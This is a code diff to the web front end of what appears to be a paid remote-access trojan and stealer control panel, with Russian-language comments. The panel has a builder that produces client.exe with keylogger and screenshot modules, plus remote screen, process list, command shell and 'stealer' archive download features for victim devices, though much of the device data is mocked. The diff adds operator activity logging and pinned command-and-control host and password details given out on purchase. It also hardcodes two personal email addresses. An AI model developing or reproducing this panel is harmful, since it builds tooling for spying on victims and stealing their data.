@@ -151,6 +151,10 @@
         .screen-video {
             width:100%; border-radius:8px; height:500px; border: none;
         }
+
+        .pinned-notification {
+            background: rgba(0,255,157,0.08); border-left: 3px solid #00ff9d;
+        }
     </style>
 </head>
 <body>
@@ -177,6 +181,28 @@
     let activeNav = 'panel';
     let isCreator = false;
     let hasPurchased = localStorage.getItem('laprpanel_purchased') === 'true';
+    // История уведомлений для вкладки "Уведомления"
+    let notificationHistory = JSON.parse(localStorage.getItem('laprpanel_notifications') || '[]');
+    // Закреплённые данные покупки
+    let pinnedHost = localStorage.getItem('laprpanel_pinned_host') || null;
+    let pinnedPassword = localStorage.getItem('laprpanel_pinned_password') || null;
+
+    function saveNotificationHistory() {
+        localStorage.setItem('laprpanel_notifications', JSON.stringify(notificationHistory));
+    }
+
+    function addNotification(message, isPinned = false) {
+        notificationHistory.unshift({
+            message,
+            time: new Date().toLocaleString(),
+            pinned: isPinned
+        });
+        // Ограничим историю 50 записями
+        if (notificationHistory.length > 50) notificationHistory.pop();
+        saveNotificationHistory();
+        // Если активна вкладка уведомлений, обновим её
+        if (activeNav === 'notify') showNotify();
+    }
 
     function showAuthForm(view = 'login') {
         currentView = view;
@@ -299,8 +325,8 @@
         document.getElementById('content').innerHTML=`
         <h1>Builder</h1><div class="card-content"><p><i class="fas fa-unlock" style="color:#00ff9d;"></i> Редактор билда</p>
         <div class="build-form">
-            <label>Сервер (IP:Port) <input type="text" id="server" value="127.0.0.1:4444"></label>
-            <label>Пароль <input type="password" id="buildPass" value="secret"></label>
+            <label>Сервер (IP:Port) <input type="text" id="server" value="${pinnedHost || '127.0.0.1:4444'}"></label>
+            <label>Пароль <input type="password" id="buildPass" value="${pinnedPassword || 'secret'}"></label>
             <div class="module-group">
                 <label><input type="checkbox" id="modKeylog" checked> Keylogger</label>
                 <label><input type="checkbox" id="modScreen" checked> Screenshot</label>
@@ -322,15 +348,55 @@
         const blob=new Blob([finalBytes],{type:'application/octet-stream'});
         const url=URL.createObjectURL(blob);
         const a=document.createElement('a'); a.href=url; a.download='client.exe'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
+        addNotification('Собран EXE-файл (Builder)');
         alert('EXE собран и сохранён!');
     }
 
-    function showNotify(){ updateActiveNav('notify'); document.getElementById('content').innerHTML='<h1>Уведомления</h1><div class="card-content"><p>Настройка уведомлений.</p></div>'; }
+    function showNotify(){
+        updateActiveNav('notify');
+        let html = '<h1>Уведомления</h1><div class="card-content">';
+        if (pinnedHost && pinnedPassword) {
+            html += `
+            <div class="pinned-notification" style="padding:12px; border-radius:12px; margin-bottom:15px;">
+                <strong>Закреплено: данные для билдера</strong><br>
+                Хост: ${pinnedHost}<br>
+                Пароль: ${pinnedPassword}
+                <button class="btn-outline" style="width:auto; margin-top:8px; padding:6px 12px;" onclick="clearPinned()">Открепить</button>
+            </div>`;
+        }
+        if (notificationHistory.length === 0) {
+            html += '<p>Пока нет уведомлений.</p>';
+        } else {
+            html += notificationHistory.map(n => `
+                <div style="border-bottom:1px solid #2a2a3a; padding:8px 0; display:flex; justify-content:space-between;">
+                    <span>${n.message} <small style="color:#888;">${n.time}</small></span>
+                    ${n.pinned ? '<span style="color:#00ff9d;">📌</span>' : ''}
+                </div>
+            `).join('');
+        }
+        html += '<button class="btn-outline" style="width:auto; margin-top:16px;" onclick="clearNotifications()">Очистить историю</button>';
+        html += '</div>';
+        document.getElementById('content').innerHTML = html;
+    }
+
+    window.clearNotifications = function() {
+        notificationHistory = [];
+        saveNotificationHistory();
+        showNotify();
+    };
+
+    window.clearPinned = function() {
+        pinnedHost = null;
+        pinnedPassword = null;
+        localStorage.removeItem('laprpanel_pinned_host');
+        localStorage.removeItem('laprpanel_pinned_password');
+        showNotify();
+    };
+
     function showCommunity(){ updateActiveNav('community'); document.getElementById('content').innerHTML='<h1>Форум</h1><div class="card-content"><p>Общий чат и новости.</p></div>'; }
     
     function showSubs(){
         updateActiveNav('subs');
-        // Всегда показываем кнопку "Купить" для тестирования
         document.getElementById('content').innerHTML = `
         <h1>Подписки</h1>
         <div class="card-content">
@@ -341,11 +407,10 @@
         </div>`;
     }
 
-    // Сброс флага покупки для тестирования
     window.resetPurchase = function() {
         localStorage.removeItem('laprpanel_purchased');
         hasPurchased = false;
-        showSubs(); // обновим страницу
+        showSubs();
     };
 
     function showSettings(){
@@ -380,26 +445,30 @@
         closeModal();
         hasPurchased = true;
         localStorage.setItem('laprpanel_purchased', 'true');
-        // Генерация портов и пароля
         const randomDomain = Math.random().toString(36).substring(2, 6) + '.' + 
                              Math.random().toString(36).substring(2, 6) + '.' + 
                              Math.random().toString(36).substring(2, 6);
         const port = Math.floor(Math.random() * 60000) + 1024;
-        const host = `larppanel.${randomDomain}:${port}`;
-        const password = 'larp' + Math.random().toString(36).substring(2, 8);
+        pinnedHost = `larppanel.${randomDomain}:${port}`;
+        pinnedPassword = 'larp' + Math.random().toString(36).substring(2, 8);
+        localStorage.setItem('laprpanel_pinned_host', pinnedHost);
+        localStorage.setItem('laprpanel_pinned_password', pinnedPassword);
+        
+        addNotification(`Покупка успешна! Хост: ${pinnedHost}, Пароль: ${pinnedPassword}`, true);
+        
         const container = document.getElementById('notifications-container');
         const notif = document.createElement('div');
         notif.className = 'notification-item';
         notif.innerHTML = `
             <div class="progress-text" style="color:#00ff9d;">Покупка успешна!</div>
             <div style="font-size:14px; color:#ccc;">
-                <div>Хост: ${host}</div>
-                <div>Пароль: ${password}</div>
+                <div>Хост: ${pinnedHost}</div>
+                <div>Пароль: ${pinnedPassword}</div>
             </div>
             <span class="close-notify" onclick="this.parentElement.remove()"><i class="fas fa-times"></i></span>`;
         container.appendChild(notif);
         setTimeout(() => { if (notif.parentElement) notif.remove(); }, 8000);
-        showSubs(); // обновить страницу подписок
+        showSubs();
     };
 
     // ========== Функции устройств ==========
@@ -415,6 +484,7 @@
             <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
         </video>`;
         overlay.classList.add('open');
+        addNotification(`Запущен просмотр экрана: ${deviceName}`);
     };
 
     window.showInfoModal = function(deviceName) {
@@ -433,6 +503,7 @@
                 <p><strong>IP:</strong> 192.168.1.15</p>
             </div>`;
         overlay.classList.add('open');
+        addNotification(`Открыта информация о системе: ${deviceName}`);
     };
 
     window.showProcessList = function(deviceName) {
@@ -451,6 +522,7 @@
                 <p>notepad.exe (PID: 7890)</p>
             </div>`;
         overlay.classList.add('open');
+        addNotification(`Открыт список процессов: ${deviceName}`);
     };
 
     window.showShell = function(deviceName) {
@@ -467,6 +539,7 @@
                 C:\\Users\\User> _
             </div>`;
         overlay.classList.add('open');
+        addNotification(`Открыта командная строка: ${deviceName}`);
     };
 
     window.closeModal = function() { document.getElementById('modal-overlay').classList.remove('open'); };
@@ -484,6 +557,8 @@
             <button class="download-btn">Скачать архив</button>
             <span class="close-notify" onclick="this.parentElement.remove()"><i class="fas fa-times"></i></span>`;
         container.appendChild(notif);
+
+        addNotification(`Запущен стиллер: ${deviceName}`);
 
         let progress = 0;
         const interval = setInterval(() => {
@@ -526,6 +601,7 @@
         URL.revokeObjectURL(url);
         const notif = document.getElementById(notifId);
         if (notif) notif.remove();
+        addNotification(`Скачан архив стиллера: ${deviceName}`);
     }
 
     window.onload = async () => {
@@ -533,6 +609,8 @@
         if (user) {
             isCreator = ['kilersosiska130@gmail.com','mamkoebar@gmail.com'].includes(user.email);
             hasPurchased = localStorage.getItem('laprpanel_purchased') === 'true';
+            pinnedHost = localStorage.getItem('laprpanel_pinned_host');
+            pinnedPassword = localStorage.getItem('laprpanel_pinned_password');
             showDashboard();
         } else {
             showAuthForm('login');
@@ -544,6 +622,8 @@
             supabaseClient.auth.getUser().then(({data:{user}})=>{
                 isCreator=['kilersosiska130@gmail.com','mamkoebar@gmail.com'].includes(user.email);
                 hasPurchased = localStorage.getItem('laprpanel_purchased') === 'true';
+                pinnedHost = localStorage.getItem('laprpanel_pinned_host');
+                pinnedPassword = localStorage.getItem('laprpanel_pinned_password');
                 showDashboard();
             });
         }
